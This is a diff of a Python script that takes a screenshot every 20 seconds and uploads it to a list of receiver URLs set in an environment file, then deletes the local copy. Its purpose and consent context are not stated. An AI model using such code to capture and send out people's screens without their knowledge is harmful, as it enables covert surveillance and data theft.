@@ -9,8 +9,17 @@ from dotenv import load_dotenv
 # Load environment variables from .env file
 load_dotenv()
 
-# Get the server URL from the .env file
-SERVER_URL = os.getenv("SERVER_URL")
+# Get the receiver URLs from the .env file
+receiver_urls_env = os.getenv("RECEIVER_URLS", "")
+
+if not receiver_urls_env:
+    raise ValueError("RECEIVER_URLS is not set in the .env file. Provide at least one URL.")
+
+# Split URLs into a list (handles single or multiple URLs)
+RECEIVER_URLS = [url.strip() for url in receiver_urls_env.split(",") if url.strip()]
+
+if not RECEIVER_URLS:
+    raise ValueError("No valid URLs found in RECEIVER_URLS.")
 
 # Screenshot capturing function
 def capture_screenshot():
@@ -26,21 +35,22 @@ def send_screenshot_via_http(filename, server_url):
         try:
             response = requests.post(
                 server_url,
-                files={'file': file}
+                files={'file': file},
+                timeout=10  # Timeout for network requests
             )
-            print(f"Server response: {response.json()}")
+            print(f"Sent to {server_url}. Response: {response.json()}")
         except Exception as e:
-            print(f"Failed to send file {filename}: {e}")
-        finally:
-            os.remove(filename)  # Clean up local copy
+            print(f"Failed to send file {filename} to {server_url}: {e}")
 
 # Scheduler task
 def take_and_send_screenshot():
     filename = capture_screenshot()
-    send_screenshot_via_http(filename, SERVER_URL)
+    for server_url in RECEIVER_URLS:
+        send_screenshot_via_http(filename, server_url)
+    os.remove(filename)  # Clean up the local screenshot file
 
 # Run periodically
 if __name__ == '__main__':
     while True:
         take_and_send_screenshot()
-        time.sleep(30)  # Wait 60 seconds
+        time.sleep(20)  # Wait 20 seconds before taking the next screenshot
